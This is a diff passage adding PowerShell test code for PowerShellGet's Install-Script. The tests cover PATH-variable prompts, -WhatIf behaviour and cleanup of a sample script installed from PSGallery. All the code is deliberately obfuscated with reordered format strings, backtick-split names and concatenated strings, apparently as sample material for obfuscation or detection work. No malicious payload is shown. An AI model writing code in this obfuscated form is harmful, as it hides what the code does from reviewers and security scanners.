+            &("{6}{8}{1}{12}{11}{4}{10}{9}{5}{0}{2}{3}{7}" -f'L','et-PATH','oc','at','rip','stall','Re','ion','s','n','tsI','rSc','VariableFo') -Scope ("{2}{0}{1}"-f 'lUser','s','Al')
+
+            ${oU`TP`UtPaTH} = ${S`Cr`IPt:TeMp`path}
+            ${gU`ID} =   $QLM::("{0}{2}{1}" -f'newgu','d','i').Invoke().("{1}{0}"-f 'ng','tostri').Invoke()
+            ${oU`Tp`UT`FIleP`AtH} = &("{1}{2}{0}"-f 'h','Joi','n-Pat') ${oUT`PUtp`ATh} "$guid"
+            ${RUnsp`ACE} = &("{1}{0}{2}{3}{4}" -f 'e','Cr','ateR','unS','pace') ${O`UTPuT`FILE`P`AtH} 1
+
+            
+            ${gLOBal`:`PrOxY}."UI"."cHoiCE`ToMa`KE" = 1
+
+            ${cOnt`e`NT} = ${nU`LL}
+
+            try {
+                ${resU`LT} = &("{3}{1}{0}{2}" -f 'man','cuteCom','d','Exe') ${Runs`pa`cE} ("{3}{5}{11}{13}{15}{7}{12}{4}{8}{0}{1}{6}{10}{2}{14}{9}"-f' -Repo','s',' PS','I','c','nstall-','itor','m-Serv','ript','ery','y','Sc','erS','ript Fabr','Gall','ika')
+            }
+            finally {
+                ${f`iLEnAME} = ("{0}{3}{1}{2}{5}{4}" -f 'P','m','ptForCho','ro','txt','ice-0.')
+                ${Pa`TH} = &("{0}{2}{1}"-f'join','h','-pat') ${o`UT`PuTFiLe`P`ATH} ${fiLen`A`mE}
+                if (&("{2}{1}{0}" -f 'h','Pat','Test-') ${P`AtH}) {
+                    ${C`ONte`NT} = &("{2}{0}{3}{1}" -f'-c','nt','get','onte') ${pa`Th}
+                }
+
+                &("{0}{2}{1}"-f'CloseRu','pace','nS') ${R`UnspaCe}
+                &("{2}{0}{1}" -f 'I','tem','Remove') ${OutPu`Tf`iLe`paTH}
+            }
+
+            ${in`S`T`ALLShouL`dpR`ocessmessA`GE} = ${scR`ipT:`loca`l`iz`Edda`Ta}."S`C`Rip`T`P`ATHPRoMpTq`UERy" -f (${ScRIpt:pROG`RA`MFile`SscRIpTSp`A`Th})
+            &("{0}{1}"-f'As','sert') (${COn`T`eNt} -and (${C`O`Ntent} -eq ${in`St`AllsH`OUlD`proC`ESsMe`sSAge})) ('I'+'nstal'+'l '+'s'+'c'+'ript '+'prom'+'pt '+'for'+' '+'add'+'i'+'ng '+'t'+'o '+'PAT'+'H '+'variab'+'le '+'is'+' '+'not'+' '+'wo'+'rkin'+'g, '+"Expected:$installShouldProcessMessage, "+"Actual:$content")
+
+            ${R`ES} = &("{1}{4}{3}{2}{0}"-f'lledScript','Ge','sta','-In','t') ("{0}{3}{2}{1}"-f'Fabrikam-Serve','t','Scrip','r')
+            &("{1}{0}{2}"-f'al','AssertEqu','s') ${R`Es}."nA`Me" ("{3}{0}{4}{1}{2}" -f'am','Se','rverScript','Fabrik','-') ('In'+'sta'+'ll-Scri'+'pt '+'s'+'hould '+'install'+' '+'a '+'sc'+'r'+'ipt '+'e'+'ven '+'wh'+'en '+'prom'+'p'+'t '+'is'+' '+'not'+' '+'a'+'ccepte'+'d, '+"$res")
+        }
+        finally {
+            
+            &("{2}{8}{4}{9}{3}{7}{0}{6}{5}{10}{1}"-f 'ta','n','Set-PA','leForScr','aria','o','llL','iptsIns','THV','b','catio') -Scope ("{2}{0}{1}" -f 'lUser','s','Al')
+
+            &("{4}{3}{2}{0}{1}" -f'i','pt','Scr','led','Get-Instal') -Name ("{5}{0}{1}{2}{3}{4}"-f'i','k','am-Serv','e','rScript','Fabr') -ErrorAction ("{2}{1}{3}{0}"-f 'lyContinue','i','S','lent') | &("{2}{4}{1}{3}{0}" -f'pt','S','Uninst','cri','all-') -Force
+        }
+    } `
+        -Skip:$((${Ps`e`diT`ion} -eq ("{0}{1}" -f 'Co','re')) -or ( $ZeNjK::"o`SVE`RSioN"."vER`SiON" -lt ("{2}{0}{1}" -f'.9','200.0','6.2')) -or (${P`scU`LTure} -ne ("{0}{1}"-f'e','n-US')))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{7}{15}{1}{12}{10}{5}{11}{4}{2}{3}{14}{13}{6}{0}{8}{9}"-f 'a','Users_Y','mptFor','Add','ro','he','ari','Ins','b','le','toT','P','ES_','HV','ingtoPAT','tallScript_All') {
+        try {
+            
+            &("{1}{0}{2}" -f 'I','Remove','tem') -Path ${SCRIPt:p`s`getSeTt`InG`S`F`ilEpaTH}
+
+            
+            &("{1}{0}{4}{2}{5}{3}{6}" -f 'bl','Reset-PATHVaria','ipts','stallLo','eForScr','In','cation') -Scope ("{1}{0}" -f 'Users','All')
+
+            ${O`UTP`UtpATH} = ${scrI`PT:TEM`Pp`ATh}
+            ${G`UiD} =   (  IteM  ("VaRIABl"+"E:ql"+"m") )."VA`Lue"::("{1}{0}{2}" -f 'ewg','n','uid').Invoke().("{0}{1}{2}" -f 'tos','tri','ng').Invoke()
+            ${oU`TpUTf`ILe`p`AtH} = &("{0}{2}{1}" -f 'Joi','h','n-Pat') ${oUt`puTp`A`Th} "$guid"
+            ${rU`N`Space} = &("{1}{2}{3}{0}"-f'eRunSpace','Cr','ea','t') ${oUtPuTF`i`leP`ATH} 1
+
+            
+            ${gLo`BAl:PRo`xy}."u`I"."chOICe`T`om`AKe" = 0
+
+            ${c`ONt`ent} = ${N`Ull}
+
+            try {
+                ${re`SULT} = &("{2}{0}{1}" -f'ecuteComman','d','Ex') ${Run`spa`CE} ("{0}{4}{11}{1}{2}{5}{9}{3}{8}{10}{12}{6}{7}" -f'Install-S','Fa','b','m-Ser','crip','r','ry PSGal','lery','verScript -','ika','Repo','t ','sito')
+            }
+            finally {
+                ${fI`LeN`AME} = ("{1}{3}{4}{0}{2}"-f 'Choice-','Pr','0.txt','om','ptFor')
+                ${Pa`Th} = &("{1}{0}{2}"-f 'oin-pa','j','th') ${ouTPU`Tfi`l`EPAth} ${F`Ile`N`AME}
+                if (&("{1}{0}{2}" -f't-','Tes','Path') ${Pa`TH}) {
+                    ${C`oN`TeNT} = &("{1}{0}{2}" -f't','ge','-content') ${pa`TH}
+                }
+
+                &("{0}{2}{1}"-f'C','ace','loseRunSp') ${r`UN`SpAce}
+                &("{0}{2}{1}" -f 'Remo','m','veIte') ${oUTpU`TF`IL`EPATH}
+            }
+
+            ${InST`Al`L`ShO`U`LDPr`OCE`SSMe`sSaGe} = ${sCri`P`T:l`ocALIzED`D`ATa}."S`CR`IptpAth`P`RomptQUeRY" -f (${S`cript`:pRog`RA`mfi`lEsS`CR`Ip`T`SpAth})
+            &("{2}{0}{1}" -f 'r','t','Asse') (${coN`T`ent} -and (${cONTe`Nt} -eq ${iNSt`ALLShoUL`DpROCessM`ESs`AgE})) ('I'+'nst'+'all '+'scrip'+'t '+'promp'+'t'+' '+'f'+'or '+'add'+'ing'+' '+'to'+' '+'PATH'+' '+'variab'+'le'+' '+'is'+' '+'n'+'ot '+'work'+'i'+'ng, '+"Expected:$installShouldProcessMessage, "+"Actual:$content")
+
+            ${R`eS} = &("{0}{2}{1}{6}{3}{5}{4}"-f 'Ge','n','t-I','ledScri','t','p','stal') ("{1}{3}{2}{5}{0}{4}"-f'r','Fab','m-Ser','rika','ipt','verSc')
+            &("{2}{1}{0}"-f 'uals','q','AssertE') ${r`ES}."Na`me" ("{0}{3}{1}{4}{2}" -f'F','ikam-Ser','ript','abr','verSc') ('Ins'+'tall-Sc'+'ript'+' '+'shou'+'ld '+'inst'+'a'+'ll '+'a '+'sc'+'ript'+' '+'e'+'ven '+'w'+'hen '+'pro'+'mpt '+'is'+' '+'not'+' '+'ac'+'ce'+'pted'+', '+"$res")
+
+            &("{0}{1}{2}" -f 'A','sse','rt') ((${EnV:`Pa`Th} -split ';') -contains ${sCrI`p`T:ProGraMf`iL`EsscripTSpA`Th}) ("{11}{0}{7}{4}{10}{9}{1}{2}{5}{6}{3}{8}"-f ' should ','AT','H','t variabl','Al',' environm','en','add ','e.','ers scope path to P','lUs','Install-Script')
+        }
+        finally {
+            
+            &("{11}{0}{4}{6}{3}{10}{5}{9}{7}{8}{2}{1}" -f'A','on','i','ab','TH','o','Vari','Instal','lLocat','rScripts','leF','Set-P') -Scope ("{2}{0}{1}" -f'U','sers','All')
+
+            &("{2}{1}{0}{3}{4}" -f'nst','I','Get-','alledScr','ipt') -Name ("{3}{4}{0}{5}{2}{1}{6}" -f'am-Serve','ip','cr','F','abrik','rS','t') -ErrorAction ("{0}{4}{3}{1}{2}"-f'SilentlyCon','u','e','in','t') | &("{2}{1}{0}{3}" -f 'l','stal','Unin','-Script') -Force
+        }
+    } `
+        -Skip:$((${p`s`eDiT`Ion} -eq ("{0}{1}" -f 'Co','re')) -or ( (gEt-item  ('VaRIAbl'+'E'+':'+'zEnJK') )."VaL`UE"::"O`sVER`Sion"."Ve`R`sION" -lt ("{1}{0}{2}" -f'00','6.2.92','.0')) -or (${pSC`ULtu`RE} -ne ("{1}{0}"-f'-US','en')))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{1}{0}{7}{3}{8}{5}{10}{2}{6}{9}{4}"-f'nst','I','_NoPromp','lScript_','dingtoPATHVariable','tU','tFo','al','Curren','rAd','ser_NoPathUpdate') {
+        try {
+            
+            &("{1}{2}{0}"-f'eItem','Re','mov') -Path ${s`C`RiP`T:pSget`Se`T`TiN`gsFIL`EPatH}
+
+            
+            &("{10}{12}{5}{9}{11}{0}{8}{4}{1}{2}{3}{6}{7}"-f 'ableForS','tsInstallLo','ca','t','rip','-P','i','on','c','AT','R','HVari','eset') -Scope ("{0}{1}{2}"-f 'Curren','tUse','r')
+
+            &("{0}{1}" -f 'Ass','ert') ((${EN`V:`PatH} -split ';') -notcontains ${ScriP`T`:mYdoc`U`MEn`TS`scrIP`TSpa`Th}) ('PAT'+'H '+'envi'+'ronmen'+'t '+'va'+'r'+'iable '+'is'+' '+'n'+'ot '+'r'+'eset'+' '+'pro'+'perl'+'y. '+"$env:PATH")
+
+            &("{3}{2}{1}{0}"-f 't','rip','c','Install-S') ("{2}{1}{6}{0}{5}{4}{3}" -f'e','Ser','Fabrikam-','ript','c','rS','v') -Repository ("{1}{0}"-f'ery','PSGall') -Scope ("{0}{1}{2}"-f'CurrentU','se','r') -NoPathUpdate -Force
+
+            ${r`Es} = &("{1}{5}{0}{2}{4}{3}"-f'talledS','G','cr','pt','i','et-Ins') ("{3}{5}{6}{0}{2}{4}{1}" -f'e','t','rverScr','F','ip','abr','ikam-S')
+            &("{3}{2}{1}{0}"-f'als','qu','rtE','Asse') ${R`ES}."NA`me" ("{5}{1}{2}{0}{4}{3}" -f 'S','Serve','r','t','crip','Fabrikam-') ('I'+'ns'+'tall-Scr'+'ipt '+'sh'+'oul'+'d '+'i'+'ns'+'tall '+'a '+'script,'+' '+"$res")
+
+            &("{1}{0}" -f'rt','Asse') ((${En`V:`path} -split ';') -notcontains ${scRipt:`MyD`oCu`m`E`NtS`sCrIPTs`pa`Th}) ("{7}{8}{13}{17}{12}{9}{16}{6}{0}{14}{15}{5}{10}{1}{4}{11}{3}{2}"-f'should not add ',' ','onment variable.','vir','scope path to PA','nt','ge ','I','nsta','ack','User','TH en','-P','l','Cur','re','a','l')
+        }
+        finally {
+            
+            &("{1}{4}{6}{0}{3}{5}{2}"-f 'orS','S','on','criptsInstallLo','et','cati','-PATHVariableF') -Scope ("{2}{1}{0}{3}" -f'ntUse','e','Curr','r')
+            &("{2}{0}{3}{1}"-f 'alledS','ript','Get-Inst','c') -Name ("{1}{2}{3}{0}" -f 'cript','Fab','rikam-S','erverS') -ErrorAction ("{2}{0}{3}{1}" -f 'ntlyCo','ue','Sile','ntin') | &("{0}{1}{4}{3}{2}" -f'U','nins','ipt','l-Scr','tal') -Force
+        }
+    } `
+        -Skip:$(${iSWIn`do`wS} -eq ${F`AlSE})
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{11}{9}{2}{7}{10}{13}{5}{1}{14}{6}{15}{0}{3}{4}{8}{12}"-f 'dingto','NoPr','pt_Cu','PA','THVar','_','A','rr','iab','i','entUser_Forc','InstallScr','le','e','omptFor','d') {
+        try {
+            
+            &("{0}{1}{2}"-f 'Re','moveIte','m') -Path ${SCrIPt:`p`SG`e`TsEt`TiNGSfIl`epatH}
+
+            
+            &("{1}{6}{2}{7}{5}{8}{0}{4}{9}{3}" -f'riptsInstallL','Reset-','ATHVa','on','oca','leFo','P','riab','rSc','ti') -Scope ("{2}{1}{0}" -f 'r','urrentUse','C')
+
+            ${sc`Ri`P`T:pSGETMo`dUL`eiNFO} = &("{4}{1}{3}{2}{0}" -f 'le','p','u','ort-Mod','Im') -Name ("{2}{0}{1}"-f 'llGe','t','PowerShe') -Force -PassThru
+
+            &("{1}{0}" -f'ert','Ass') ((${e`Nv:pa`TH} -split ';') -notcontains ${ScriP`T:`mYD`ocume`N`TSs`CrI`ptsp`Ath}) ('PAT'+'H '+'en'+'v'+'ironme'+'nt '+'va'+'riable '+'i'+'s '+'n'+'ot '+'r'+'eset '+'prop'+'erly'+'.'+' '+"$env:PATH")
+
+            ${CU`RRENtPatH`VA`lUE} = & ${SCR`ipt`:p`sgETMOdUlei`NFo} ("{3}{1}{0}{4}{2}{5}"-f'-En','et','aria','G','vironmentV','ble') -Name ("{0}{1}"-f'P','ATH') -Target ${Scri`PT:eNVi`R`onmENtVa`Ri`ABlEtARgEt}."U`sER"
+            &("{1}{0}" -f 'rt','Asse') ((${CuR`RENt`P`A`Thv`Alue} -split ';') -notcontains ${s`c`Ri`P`T:mydocuMENT`Sscr`i`pTsP`A`TH}) ('PA'+'TH '+'e'+'nviro'+'nme'+'nt '+'vari'+'abl'+'e'+' '+'i'+'s '+'no'+'t '+'rese'+'t '+'pr'+'o'+'perly. '+"$currentPATHValue")
+
+            &("{3}{1}{2}{4}{0}"-f'ipt','nsta','l','I','l-Scr') ("{3}{0}{2}{1}" -f'rikam','erverScript','-S','Fab') -Repository ("{1}{3}{2}{0}"-f'y','P','r','SGalle') -Scope ("{2}{0}{1}" -f 'nt','User','Curre') -Force
+
+            ${r`ES} = &("{1}{2}{3}{0}"-f'edScript','Get-','Ins','tall') ("{3}{1}{0}{2}{4}"-f'verSc','Ser','r','Fabrikam-','ipt')
+            &("{0}{2}{1}"-f'As','rtEquals','se') ${r`ES}."Na`ME" ("{4}{1}{3}{2}{0}"-f'erScript','rik','v','am-Ser','Fab') ('Instal'+'l-'+'S'+'cript '+'shou'+'ld'+' '+'ins'+'tal'+'l '+'a '+'s'+'cript'+', '+"$res")
+
+            &("{1}{0}" -f't','Asser') ((${e`Nv:`PaTh} -split ';') -contains ${S`CR`IPT`:myDOCu`meNTs`SC`RiPtS`pAtH}) ("{8}{4}{10}{13}{16}{6}{12}{11}{5}{9}{1}{7}{2}{17}{14}{3}{0}{15}" -f'riable','c','h to PATH envi',' va','tall-P','er',' add Cur','ope pat','Ins',' s','ackage','ntUs','re',' sh','ent','.','ould','ronm')
+
+            ${C`URRE`N`TP`AtHvalue} = & ${Scr`Ip`T:Ps`g`ETMOD`Ul`Ein`FO} ("{0}{1}{2}{3}{5}{4}" -f'Get-Enviro','nment','Vari','a','le','b') -Name ("{0}{1}"-f 'PA','TH') -Target ${scr`iP`T`:envIRonme`NtvariA`B`lEta`Rg`eT}."US`er"
+            &("{0}{1}"-f 'As','sert') ((${cuRre`N`TPAt`hvAL`UE} -split ';') -contains ${scr`I`Pt`:MydOc`UMent`S`S`CRIpTs`PAth}) ('I'+'n'+'st'+'all-Package '+'s'+'h'+'ould '+'ad'+'d '+'CurrentUse'+'r'+' '+'scop'+'e '+'p'+'ath '+'t'+'o '+'PA'+'TH '+'env'+'i'+'ronment '+'var'+'i'+'a'+'ble. '+"$currentPATHValue")
+        }
+        finally {
+            
+            &("{9}{10}{7}{0}{5}{8}{1}{4}{2}{6}{3}" -f 'r','ns','allL','n','t','Scr','ocatio','o','iptsI','Set-PATHVaria','bleF') -Scope ("{1}{3}{0}{2}"-f 'rentU','C','ser','ur')
+            &("{0}{1}{5}{2}{4}{3}"-f 'Ge','t-In','a','Script','lled','st') -Name ("{4}{2}{1}{5}{3}{0}" -f 'pt','a','ik','ServerScri','Fabr','m-') -ErrorAction ("{0}{2}{3}{1}"-f 'Sile','ntinue','ntl','yCo') | &("{0}{1}{2}{3}"-f'U','ni','nsta','ll-Script') -Force
+
+            ${s`CRIPt:`PsGeTMO`DULE`Info} = &("{2}{0}{3}{1}" -f 't','Module','Impor','-') -Name ("{0}{1}{2}"-f'P','owerShellGe','t') -Force -PassThru
+        }
+    } `
+        -Skip:$(${i`SwINDO`ws} -eq ${Fa`Lse})
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{4}{6}{1}{0}{7}{5}{2}{12}{9}{10}{11}{3}{8}" -f 'S','l','P','oPA','I','pt_CurrentUser_NO_toThe','nstal','cri','THVariable','o','rAdd','ingt','romptF') {
+        try {
+            
+            &("{0}{2}{3}{1}" -f'R','tem','emove','I') -Path ${scr`IPT`:pS`getsEtTING`s`FiL`ep`Ath}
+
+            
+            &("{2}{12}{1}{9}{0}{8}{7}{11}{10}{6}{4}{3}{5}" -f '-PAT','e','R','L','l','ocation','riptsInstal','Varia','H','t','orSc','bleF','es') -Scope ("{1}{2}{0}"-f'tUser','Cur','ren')
+
+            ${O`UTpu`TPa`Th} = ${sCrIpT:`TeM`pp`AtH}
+            ${gu`ID} =   ( gEt-VArIABLE ('q'+'LM')  -vAluEOn)::("{0}{1}" -f 'newg','uid').Invoke().("{2}{1}{0}" -f 'ng','stri','to').Invoke()
+            ${oUtPUtf`iLe`P`ATh} = &("{0}{2}{1}" -f'Joi','th','n-Pa') ${OUT`P`U`TpATH} "$guid"
+            ${rUn`sPAce} = &("{2}{1}{0}" -f 'unSpace','ateR','Cre') ${oUTp`UTFil`epAth} 1
+
+            
+            ${glo`Bal:`pROxy}."U`i"."CH`O`I`CetoMAKE" = 1
+
+            ${coNT`ENt} = ${n`ULL}
+
+            try {
+                ${rE`S`UlT} = &("{2}{3}{0}{1}{4}"-f'C','omma','Exe','cute','nd') ${R`UNSp`AcE} ("{4}{14}{7}{8}{6}{15}{11}{5}{13}{10}{2}{9}{0}{1}{3}{12}"-f'ope',' Curre','ry P','n','Install-Sc','osi','ikam-Serve','ipt F','abr','SGallery -Sc','o','-Rep','tUser','t','r','rScript ')
+            }
+            finally {
+                ${f`I`LEn`AmE} = ("{0}{4}{2}{1}{3}{5}"-f'Prom','r','Fo','Choice-0.','pt','txt')
+                ${p`ATH} = &("{0}{1}" -f'join-p','ath') ${ou`TP`UTF`ilePATh} ${FILe`N`Ame}
+                if (&("{1}{0}{2}" -f 'st-','Te','Path') ${p`Ath}) {
+                    ${Co`NtE`NT} = &("{1}{3}{0}{2}" -f 'en','get','t','-cont') ${Pa`TH}
+                }
+
+                &("{2}{1}{0}" -f 'ce','RunSpa','Close') ${RU`NSpA`Ce}
+                &("{0}{1}{2}{3}"-f'Rem','o','ve','Item') ${oUTpUT`F`i`lepATh}
+            }
+
+            ${i`NSTALLSHO`ULdpRO`ceSs`Mes`SA`GE} = ${s`c`RI`p`T:loc`ALi`ZeDdAta}."sCri`Ptp`ATHpR`oMpTQu`E`Ry" -f (${scRIpT:`MyDOcUME`NTS`S`cR`iPT`sPaTh})
+            &("{1}{0}" -f'ert','Ass') (${coNT`e`Nt} -and (${conTE`NT} -eq ${iNSt`AllS`hOu`LD`Pr`OcE`SSme`SsagE})) ('Install'+' '+'script'+' '+'promp'+'t '+'for'+' '+'addin'+'g '+'to'+' '+'PA'+'TH '+'v'+'aria'+'ble '+'i'+'s '+'not'+' '+'work'+'ing,'+' '+"Expected:$installShouldProcessMessage, "+"Actual:$content")
+
+            ${R`es} = &("{0}{3}{4}{1}{2}"-f'G','n','stalledScript','et','-I') ("{2}{3}{1}{6}{0}{5}{4}" -f 'r','i','F','abr','Script','ver','kam-Se')
+            &("{0}{2}{1}{3}" -f 'A','rtEq','sse','uals') ${r`es}."N`AmE" ("{4}{3}{1}{2}{0}{5}" -f'ri','Serv','erSc','m-','Fabrika','pt') ('Inst'+'a'+'ll-Scr'+'ipt '+'sho'+'uld'+' '+'insta'+'ll'+' '+'a '+'scr'+'ipt'+' '+'eve'+'n '+'wh'+'en '+'p'+'ro'+'mpt '+'is'+' '+'not'+' '+'accept'+'ed'+', '+"$res")
+        }
+        finally {
+            
+            &("{1}{4}{0}{2}{6}{3}{7}{5}" -f 'F','Set-PATH','orS','sInstal','Variable','tion','cript','lLoca') -Scope ("{0}{2}{1}" -f'Cu','er','rrentUs')
+            &("{3}{1}{2}{0}{4}"-f'ledS','et-In','stal','G','cript') -Name ("{4}{1}{0}{2}{3}" -f'-S','abrikam','erve','rScript','F') -ErrorAction ("{4}{0}{1}{3}{2}"-f'tlyCont','in','e','u','Silen') | &("{1}{2}{4}{3}{0}"-f'cript','Un','install','S','-') -Force
+        }
+    } `
+        -Skip:$((${PSED`ITi`on} -eq ("{1}{0}"-f 'e','Cor')) -or ( ( gCI  ('vArIABl'+'E:'+'ZeNJk'))."VA`LUE"::"O`sVE`RsIon"."v`ERsIOn" -lt ("{0}{2}{1}" -f '6.','200.0','2.9')) -or (${P`scULTU`Re} -ne ("{1}{0}"-f'n-US','e')))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{9}{10}{5}{2}{3}{0}{12}{6}{11}{4}{8}{13}{1}{7}"-f'S','gt','User_','YE','A','t','ThePro','oPATHVariable','ddi','InstallScript_C','urren','mptFor','_to','n') {
+        try {
+            
+            &("{1}{0}{2}"-f 'moveI','Re','tem') -Path ${sCRiP`T:PsGE`TSetTIn`gSFiLe`P`A`Th}
+
+            
+            &("{9}{4}{0}{8}{10}{2}{5}{11}{6}{1}{12}{3}{7}" -f's','sI','r','ocat','e','i','ript','ion','et-PATHV','R','a','ableForSc','nstallL') -Scope ("{3}{1}{0}{2}" -f's','ntU','er','Curre')
+
+            ${O`UT`Putpa`TH} = ${SC`RI`PT:TEM`Pp`AtH}
+            ${G`UID} =   $QlM::("{1}{0}"-f 'id','newgu').Invoke().("{0}{1}"-f 't','ostring').Invoke()
+            ${O`UtPU`TFILE`pATh} = &("{0}{2}{1}{3}" -f 'Join-P','t','a','h') ${O`UtpU`T`paTh} "$guid"
+            ${R`UnS`PaCE} = &("{3}{1}{2}{0}"-f 'nSpace','teR','u','Crea') ${outp`Ut`Fi`lEp`AtH} 1
+
+            
+            ${Gl`oB`Al:p`R`oxy}."UI"."ChoIcETOm`A`Ke" = 0
+
+            ${cO`NTE`NT} = ${N`UlL}
+
+            try {
+                ${ReS`UlT} = &("{2}{0}{1}"-f 'uteComman','d','Exec') ${RUn`s`PaCE} ("{5}{12}{0}{8}{15}{9}{11}{10}{2}{1}{13}{3}{14}{4}{6}{7}"-f'ri','SGall','pository P','ry -',' Cur','Inst','rentU','ser','k','-',' -Re','ServerScript','all-Script Fab','e','Scope','am')
+            }
+            finally {
+                ${F`iLE`NAME} = ("{3}{1}{0}{2}" -f '-','ptForChoice','0.txt','Prom')
+                ${P`AtH} = &("{0}{1}{2}" -f'jo','in-pa','th') ${o`UTp`UtFIlEPa`Th} ${f`ilE`NAMe}
+                if (&("{0}{1}{2}" -f'T','est','-Path') ${P`AtH}) {
+                    ${C`o`NTENt} = &("{2}{0}{1}" -f '-','content','get') ${PA`TH}
+                }
+
+                &("{1}{0}{2}" -f'p','CloseRunS','ace') ${ru`NSpACE}
+                &("{1}{0}{2}" -f 'em','R','oveItem') ${oUtPUTFiL`e`pAtH}
+            }
+
+            ${INst`ALl`SHOuLdPrO`c`esS`mE`ss`AGe} = ${scr`i`PT:L`OCA`L`IzeDdAtA}."Scr`IpTPAtH`p`R`OMPTq`Ue`Ry" -f (${scri`p`T`:My`D`O`C`UMen`TSscRiptsPAth})
+            &("{1}{0}" -f 'ert','Ass') (${co`N`TEnt} -and (${CO`NTe`Nt} -eq ${INst`AlLsho`U`L`dp`ROCE`sSMEs`saGe})) ('Instal'+'l '+'scri'+'pt '+'prompt'+' '+'f'+'or '+'add'+'ing '+'t'+'o '+'P'+'ATH '+'va'+'riable '+'i'+'s '+'no'+'t '+'wo'+'rk'+'in'+'g, '+"Expected:$installShouldProcessMessage, "+"Actual:$content")
+
+            ${R`Es} = &("{4}{2}{3}{1}{0}" -f 't','dScrip','t','alle','Get-Ins') ("{0}{1}{3}{4}{2}"-f'Fa','b','verScript','rik','am-Ser')
+            &("{1}{0}{2}"-f'ertEqual','Ass','s') ${r`eS}."N`AMe" ("{0}{2}{1}{3}"-f 'Fabrikam','erverScri','-S','pt') ('Ins'+'ta'+'l'+'l-Scrip'+'t '+'shou'+'ld '+'inst'+'al'+'l '+'a '+'scri'+'p'+'t '+'eve'+'n '+'whe'+'n '+'prom'+'pt '+'i'+'s '+'n'+'ot '+'accepte'+'d'+', '+"$res")
+
+            &("{1}{0}" -f 't','Asser') ((${e`Nv:pa`TH} -split ';') -contains ${sc`R`ipT:myDOC`UMeNt`sSCR`IPtSPaTH}) ("{5}{10}{4}{8}{9}{12}{7}{0}{11}{1}{6}{2}{3}"-f'h to ','H','ironment variable','.','add Cur','Instal',' env','t','rentUser sc','op','l-Script should ','PAT','e pa')
+        }
+        finally {
+            
+            &("{5}{4}{1}{2}{0}{6}{3}"-f'rScrip','iabl','eFo','on','ATHVar','Set-P','tsInstallLocati') -Scope ("{1}{3}{0}{2}" -f'rent','C','User','ur')
+            &("{3}{0}{1}{2}" -f 'talledScr','i','pt','Get-Ins') -Name ("{2}{3}{1}{0}{4}"-f '-ServerScr','rikam','Fa','b','ipt') -ErrorAction ("{1}{0}{3}{2}"-f'C','Silently','ue','ontin') | &("{1}{2}{3}{0}"-f 'cript','Uninstall','-','S') -Force
+        }
+    } `
+        -Skip:$((${pSe`Di`Tion} -eq ("{0}{1}" -f 'Co','re')) -or ( (geT-itEM  ('Va'+'rI'+'abLE:zENjK')  )."v`ALUe"::"osVE`RSi`On"."vE`Rs`iON" -lt ("{3}{1}{0}{2}"-f '0.','2.920','0','6.')) -or (${pscu`lTU`Re} -ne ("{0}{1}" -f 'e','n-US')))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{3}{1}{0}{4}{2}"-f 'lSc','nstal','hWhatIf','I','riptWit') {
+        ${Out`pu`T`PaTh} = ${s`C`RI`P`T:Temp`pATH}
+        ${G`UId} =   ( GEt-VariAblE ("q"+"lm")  -vaLueO  )::("{1}{0}"-f'd','newgui').Invoke().("{1}{0}{2}"-f 's','to','tring').Invoke()
+        ${OutpUt`Fil`EPA`Th} = &("{1}{0}{2}" -f 'oin-P','J','ath') ${OUT`Pu`T`patH} "$guid"
+        ${Ru`NSp`AcE} = &("{2}{3}{0}{1}{4}" -f'S','p','Cr','eateRun','ace') ${oU`TpU`TFiLEPa`TH} 1
+        ${CO`NTent} = ${N`ULl}
+
+        try {
+            ${r`eSULt} = &("{0}{2}{3}{1}{4}"-f'Execu','man','te','Com','d') ${run`sp`ACe} ("{8}{5}{4}{7}{9}{6}{11}{1}{10}{3}{2}{0}" -f'f',' Fab',' -WhatI','-ServerScript','pt','l-Scri','m',' -N','Instal','a','rikam','e')
+        }
+        finally {
+            ${F`iL`enAMe} = ("{1}{3}{2}{0}" -f'xt','W','ne-0.t','riteLi')
+            ${p`AtH} = &("{0}{1}"-f 'j','oin-path') ${OutpUTfIlep`A`TH} ${F`IlEN`AmE}
+            if (&("{0}{1}{2}" -f'Test','-','Path') ${P`ATh}) {
+                ${cOn`Te`NT} = &("{2}{1}{0}"-f't','en','get-cont') ${pa`TH}
+            }
+
+            &("{0}{2}{1}" -f'C','ace','loseRunSp') ${rU`Ns`PaCE}
+            &("{0}{1}{2}" -f'Remo','veIt','em') ${OuTPut`F`iLe`paTH}
+        }
+
+        ${i`TeMinFO} = &("{2}{1}{0}" -f 'Script','ind-','F') ("{2}{1}{6}{3}{0}{5}{4}" -f 've','am','Fabrik','Ser','t','rScrip','-') -Repository ("{1}{0}{2}" -f 'Galler','PS','y')
+        ${IN`sTal`L`sH`oULdprocessmEss`Age} = ${s`cRiPT`:lOcaLiZe`DDaTA}."inSTA`llsC`Riptwha`Tifme`sSA`gE" -f (${iTEMi`N`FO}."N`AmE", ${iT`EM`In`Fo}."vEr`si`on")
+        &("{0}{2}{1}"-f 'A','sert','s') (${co`N`TEnt} -and (${C`OnT`enT} -match ${InStALlsHo`U`LdprOC`eSsM`es`SagE})) ('I'+'nstall '+'s'+'cr'+'ipt '+'what'+'if '+'message'+' '+'i'+'s '+'m'+'issi'+'ng, '+"Expected:$installShouldProcessMessage, "+"Actual:$content")
+
+        ${r`ES} = &("{3}{2}{4}{1}{0}" -f 'cript','S','et-Inst','G','alled') ("{3}{2}{0}{1}"-f 'kam-Serv','erScript','abri','F') -ErrorAction ("{0}{3}{1}{2}{4}" -f'Sil','Cont','inu','ently','e') -WarningAction ("{0}{3}{1}{4}{2}"-f'S','lent','tinue','i','lyCon')
+        &("{1}{2}{0}"-f't','As','ser') (-not ${r`es}) ("{6}{8}{12}{9}{2}{3}{7}{5}{0}{4}{10}{11}{1}" -f't wi','n','d not insta','ll th','th ','rip','Inst','e sc','a','l','-W','hatIf optio','ll-Script shou')
+    } `
+        -Skip:$((${PSe`d`iti`on} -eq ("{1}{0}" -f're','Co')) -or ( (  GeT-variablE  zenJK )."vAl`Ue"::"Osv`e`RsiON"."Ver`SIOn" -lt ("{2}{1}{0}" -f'.0','2.9200','6.')) -or (${PsCUL`T`URe} -ne ("{1}{0}"-f'-US','en')))
+
+    
+    
+    
+    
+    
+    
+    &('It') ("{2}{5}{1}{6}{0}{3}{4}"-f 'NoT','onfirm','InstallScrip','oProm','pt','tWithC','And') {
